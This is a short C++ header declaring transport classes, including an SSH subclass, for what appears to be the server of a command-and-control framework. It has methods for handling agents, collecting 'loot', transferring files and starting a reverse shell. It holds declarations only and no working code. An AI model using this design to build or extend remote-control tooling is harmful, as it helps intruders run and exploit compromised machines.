#include "common.h"
#include "typedefs.h"

class ServerTransport
{
private:
    pClientNode node;
public:
    virtual int download_file(char *ptr, int is_manager, char *extra);
    virtual int get_loot(char *ptr);
    virtual int upload_file(char *ptr, int is_module);
    virtual int get_info(char *ptr);
    virtual int init_reverse_shell();
    virtual int manager_handler();
    virtual int agent_handler();
    virtual int determine_handler();
    virtual int handle_auth();
    virtual int authenticate(void *sess);

    pClientNode get_node(){return this->node;};
    virtual void make_agent(char *dat_ptr, char *d_ptr);
};


class Ssh_Transport: public ServerTransport
{
private:
    class Log *logger;
    class List *list;
    class AgentInformationHandler *agent;
    pClientNode node;
public:
    Ssh_Transport(class Log *logger, class List *list, class AgentInformationHandler *agent, pClientNode node);
    ~Ssh_Transport();
    int determine_handler() override;
    int upload_file(char *ptr, int is_module) override;
    int download_file(char *ptr, int is_manager, char *extra) override;
    int get_loot(char *ptr) override;
    int get_info(char *ptr) override;
    int authenticate(void *sess) override;
    void make_agent(char *dat_ptr, char *d_ptr) override;
};